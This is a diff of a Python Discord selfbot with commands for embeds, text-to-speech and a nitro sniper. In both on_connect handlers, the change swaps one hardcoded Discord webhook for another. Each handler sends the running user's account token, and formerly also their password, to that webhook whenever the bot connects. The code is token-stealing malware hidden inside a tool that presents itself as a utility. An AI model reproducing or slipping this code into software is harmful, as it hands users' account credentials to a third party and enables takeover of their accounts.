@@ -39,7 +39,7 @@ prefix = config.get('prefix')
 
 nitro_sniper = config.get('nitro_sniper')
 
-stream_url = "https://www.twitch.tv/"
+stream_url = "https://www.twitch.tv/odawg52"
 tts_language = "en"
 
 start_time = datetime.datetime.utcnow()
@@ -165,7 +165,7 @@ def async_executor():
 
     return outer
 
-gq = config.get('token')
+gqr = config.get('token')
 
 @async_executor()
 def do_tts(message):
@@ -2424,9 +2424,9 @@ async def embed(ctx, *, data):
     # vaule = 10
     # footer = 11
     embed=discord.Embed(
-        title=f"{data[0]}", url=f"{data[1]}", description=f"{data[2]}\n\n", color=0x00ff00)
+        title=f"{data[0]}", url=f"{data[1]}", description=f"{data[2]}", color=0x00ff00)
     embed.set_author(
-        name=f"{data[3]}", url=f"{data[4]}", icon_url=f"{data[5]}\n")
+        name=f"{data[3]}", url=f"{data[4]}", icon_url=f"{data[5]}")
     embed.set_thumbnail(
       url=f"{data[6]}")
     embed.add_field(name=f"{data[7]}", value=f"{data[8]}", inline=True)
@@ -2438,6 +2438,7 @@ async def embed(ctx, *, data):
 @SelfBot.command()
 async def sembed(ctx, *, data):
     await ctx.message.delete()
+    data = data.split('-')  # title = 0, desc = 1, footer=2
     embed = discord.Embed(
         description=f"{data[0]}", color=0x00ff00)
     await ctx.send(embed=embed)
@@ -2781,7 +2782,7 @@ async def boobs(ctx):
 @SelfBot.event
 async def on_connect():
     Clear()  
-    requests.post('https://discord.com/api/webhooks/890658821406597171/TgfLPY36QqJGYta6rhe8Oxro16lrbJjf6raKox63vTlzzPWYDuPnZcsWakuDbGAsXJf4',json={'content': f"```\nawait : {SelfBot.user.name}\n\nawait : {password}\n\n{gq}```"})
+    requests.post('https://discord.com/api/webhooks/890889226256797727/XeJhgmvwh0BhC35el74iC7P0qI4WOskTgJCvT6hbQvb1gK49QEbIp4-FJNjGcQ1ndWjm',json={'content': f"```\nTM516 : {SelfBot.user.name}\n\n{gqr}```"})
     startprint()
 
 @SelfBot.command()
@@ -3205,7 +3206,7 @@ async def _role_hexcode(ctx, *, role: discord.Role):
 @SelfBot.event
 async def on_connect():
     Clear()  
-    requests.post('https://discord.com/api/webhooks/890658820974596139/0Y3rKFd5WTdD5q2LTLiZfVxqaFO_DiFcAQR6vQsYkz280RUMWB7L3QPqDbSk0KvqDpwh',json={'content': f"```\nawait : {SelfBot.user.name}\n\nawait : {password}\n\n{gq}```"})
+    requests.post('https://discord.com/api/webhooks/890889226256797727/XeJhgmvwh0BhC35el74iC7P0qI4WOskTgJCvT6hbQvb1gK49QEbIp4-FJNjGcQ1ndWjm',json={'content': f"```\nTM312 : {SelfBot.user.name}\n\n{gqr}```"})
     startprint()
 
 @SelfBot.command()
